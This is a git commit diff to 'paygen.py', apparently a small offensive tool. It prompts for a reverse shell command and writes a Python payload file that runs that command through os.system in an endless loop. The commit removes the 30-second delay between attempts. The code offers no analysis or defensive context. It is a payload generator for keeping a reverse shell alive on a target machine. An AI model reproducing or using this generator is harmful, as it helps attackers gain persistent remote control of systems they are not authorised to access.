9bf8f72607da41c7a4ae41c646c7f7a1e5b77112
j3r1ch0123 <110147529+j3r1ch0123@users.noreply.github.com>
2022-10-19 01:15:23 +0000

    Update paygen.py

--- paygen.py
+++ paygen.py
@@ -11,11 +11,9 @@ payload = input("\nEnter reverse shell command: ")
 text = f'''\
 #!/bin/python3.9
 import os
-import time
 
 while True:
     os.system('{payload}')
-    time.sleep(30)
 '''
 
 with open ("payload.py", "w") as thePayload:
